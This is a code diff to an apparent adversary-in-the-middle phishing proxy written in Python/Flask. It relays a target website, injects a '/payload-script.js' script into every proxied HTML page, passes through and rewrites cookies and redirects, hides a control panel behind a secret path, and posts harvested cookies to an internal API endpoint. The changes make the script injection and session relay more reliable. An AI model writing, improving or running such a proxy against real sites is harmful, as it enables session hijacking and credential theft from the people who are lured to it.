@@ -3,6 +3,9 @@ import requests
 import json
 import os
 from datetime import datetime
+from urllib.parse import urljoin, urlparse
+import re
+from bs4 import BeautifulSoup
 import brotli
 from core.database import Database
 from core.detection import DataDetector
@@ -49,6 +52,51 @@ initialize_discord_bot()
 
 def start_proxy(target, host, port, secret):
     app = Flask(__name__, static_folder='panel', static_url_path='')
+    session = requests.Session()
+    session.verify = False
+
+    def modify_html(content, base_url):
+        try:
+            soup = BeautifulSoup(content, 'html.parser')
+            
+            # Inject our payload
+            if soup.head:
+                script = soup.new_tag('script', src='/payload-script.js')
+                soup.head.append(script)
+            elif soup.body:
+                script = soup.new_tag('script', src='/payload-script.js')
+                soup.body.insert(0, script)
+
+            # Fix all relative URLs
+            for tag in soup.find_all(['a', 'link', 'script', 'img', 'form', 'iframe']):
+                for attr in ['href', 'src', 'action']:
+                    if tag.get(attr):
+                        url = tag[attr]
+                        if url.startswith('//'):
+                            tag[attr] = f'https:{url}'
+                        elif url.startswith('/'):
+                            tag[attr] = f'/{url.lstrip("/")}'
+                        elif not url.startswith(('http://', 'https://', 'data:', '#', 'javascript:', 'mailto:')):
+                            tag[attr] = f'/{url}'
+
+            # Fix form submissions
+            for form in soup.find_all('form'):
+                if not form.get('action'):
+                    form['action'] = '/'
+                
+            # Fix JavaScript redirects and window.location
+            for script in soup.find_all('script'):
+                if script.string:
+                    script.string = re.sub(
+                        r'window\.location(?:\.href)?\s*=\s*["\']([^"\']+)["\']',
+                        lambda m: f'window.location = "/{m.group(1).lstrip("/")}"',
+                        script.string
+                    )
+
+            return str(soup)
+        except Exception as e:
+            print(f"HTML modification error: {e}")
+            return content
 
     # Serve panel files
     @app.route(f'/{secret}')
@@ -73,24 +121,26 @@ def start_proxy(target, host, port, secret):
             filename = path[len(secret)+1:]
             return panel_files(filename)
 
-        # Create session with custom settings
-        session = requests.Session()
-        session.verify = False
-        session.timeout = 10
-
-        # Build target URL
-        target_url = f"https://{target}/{path}"
-        if request.query_string:
-            target_url += f"?{request.query_string.decode()}"
-
-        print(f"{Fore.CYAN}[*] Proxying: {request.method} {target_url}{Fore.RESET}")
+        # Handle OPTIONS requests
+        if request.method == 'OPTIONS':
+            response = Response('')
+            response.headers['Access-Control-Allow-Origin'] = '*'
+            response.headers['Access-Control-Allow-Methods'] = '*'
+            response.headers['Access-Control-Allow-Headers'] = '*'
+            return response
 
         try:
+            # Build target URL
+            target_url = f"https://{target}/{path}"
+            if request.query_string:
+                target_url += f"?{request.query_string.decode()}"
+
             # Prepare headers
             headers = dict(request.headers)
-            headers['Host'] = target
+            headers.pop('Host', None)
             headers.pop('If-None-Match', None)
             headers.pop('If-Modified-Since', None)
+            headers['Host'] = target
 
             # Forward the request
             resp = session.request(
@@ -99,49 +149,46 @@ def start_proxy(target, host, port, secret):
                 headers=headers,
                 data=request.get_data(),
                 cookies=request.cookies,
-                allow_redirects=False,  # Handle redirects manually
-                timeout=10
+                allow_redirects=False,
+                timeout=30
             )
 
-            # Handle redirects within our proxy
+            # Handle redirects
             if resp.status_code in [301, 302, 303, 307, 308]:
                 location = resp.headers.get('Location', '')
-                if location.startswith('/'):
-                    location = f"/{location.lstrip('/')}"
-                elif location.startswith(f'https://{target}'):
-                    location = location[len(f'https://{target}'):]
+                if location.startswith('http'):
+                    parsed = urlparse(location)
+                    if parsed.netloc == target:
+                        location = parsed.path
+                        if parsed.query:
+                            location += f"?{parsed.query}"
+                elif not location.startswith('/'):
+                    location = f"/{location}"
                 return redirect(location, code=resp.status_code)
 
-            # Process response headers
-            headers = [(name, value) for name, value in resp.headers.items()
-                      if name.lower() not in ['content-length', 'transfer-encoding', 'connection']]
-
-            # Process content
+            # Process response
             content = resp.content
             content_type = resp.headers.get('Content-Type', '').lower()
 
+            # Modify HTML content
             if 'text/html' in content_type:
                 try:
                     decoded = content.decode('utf-8')
-                    payload = '<script src="/payload-script.js"></script>'
-                    
-                    if '</head>' in decoded:
-                        decoded = decoded.replace('</head>', f'{payload}</head>')
-                    elif '<body>' in decoded:
-                        decoded = decoded.replace('<body>', f'<body>{payload}')
-                    
-                    # Fix relative paths
-                    decoded = decoded.replace('href="/', 'href="/')
-                    decoded = decoded.replace('src="/', 'src="/')
-                    decoded = decoded.replace('action="/', 'action="/')
-                    
-                    content = decoded.encode('utf-8')
+                    modified = modify_html(decoded, target_url)
+                    content = modified.encode('utf-8')
                 except:
-                    pass  # Use original content if decode fails
+                    pass
 
+            # Prepare response headers
+            headers = []
+            for key, value in resp.headers.items():
+                if key.lower() not in ['content-length', 'transfer-encoding', 'content-encoding', 'connection']:
+                    headers.append((key, value))
+
+            # Create response
             response = Response(content, resp.status_code, headers)
 
-            # Copy cookies from response
+            # Handle cookies
             for cookie in resp.cookies:
                 response.set_cookie(
                     key=cookie.name,
@@ -156,19 +203,12 @@ def start_proxy(target, host, port, secret):
             return response
 
         except requests.exceptions.Timeout:
-            print(f"{Fore.RED}[!] Request timed out for: {target_url}{Fore.RESET}")
-            return "Request timed out. Please try again.", 504
-
+            return "Request timed out", 504
         except requests.exceptions.ConnectionError:
-            print(f"{Fore.RED}[!] Connection error for: {target_url}{Fore.RESET}")
-            return "Failed to connect to the target server.", 502
-
+            return "Failed to connect to target server", 502
         except Exception as e:
-            print(f"{Fore.RED}[!] Proxy Error: {str(e)}{Fore.RESET}")
-            return "An error occurred while processing your request.", 500
-
-        finally:
-            session.close()
+            print(f"Proxy error: {e}")
+            return "Internal server error", 500
 
     @app.route('/ep/api/cookies', methods=['POST'])
     def handle_cookies():
